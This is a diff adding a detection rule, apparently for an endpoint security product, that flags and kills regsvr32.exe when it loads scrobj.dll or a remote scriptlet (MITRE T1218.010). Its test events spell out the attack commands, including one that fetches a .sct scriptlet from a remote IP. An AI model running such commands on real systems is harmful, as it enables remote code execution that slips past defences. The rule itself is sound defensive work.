@@ -1,0 +1,36 @@
+[rule]
+id = "etap-013"
+name = "Regsvr32 Running a Scriptlet"
+description = "regsvr32.exe loading a script component (scrobj.dll) or a remote address instead of registering a library."
+version = "1"
+author = "E-TAP team"
+license = "MIT"
+os_list = ["windows"]
+query = '''process where
+  process.name in~ ("regsvr32.exe")
+  and process.command_line : ("scrobj.dll", "/i:http")
+'''
+
+[[actions]]
+action = "kill_process"
+
+[[threat]]
+tactic.name = "Defense Evasion"
+[[threat.technique]]
+id = "T1218.010"
+name = "System Binary Proxy Execution: Regsvr32"
+
+[[tests]]
+name = "remote scriptlet"
+expect = "match"
+event = { _category = "process", event = { action = "start" }, process = { name = "regsvr32.exe", executable = "C:\\Windows\\System32\\regsvr32.exe", command_line = "regsvr32 /s /n /u /i:http://203.0.113.5/a.sct scrobj.dll" } }
+
+[[tests]]
+name = "local scriptlet"
+expect = "match"
+event = { _category = "process", event = { action = "start" }, process = { name = "regsvr32.exe", executable = "C:\\Windows\\System32\\regsvr32.exe", command_line = "regsvr32.exe /s /u /i:C:\\x.sct scrobj.dll" } }
+
+[[tests]]
+name = "normal registration"
+expect = "no_match"
+event = { _category = "process", event = { action = "start" }, process = { name = "regsvr32.exe", executable = "C:\\Windows\\System32\\regsvr32.exe", command_line = "regsvr32.exe /s C:\\Windows\\System32\\vbscript.dll" } }
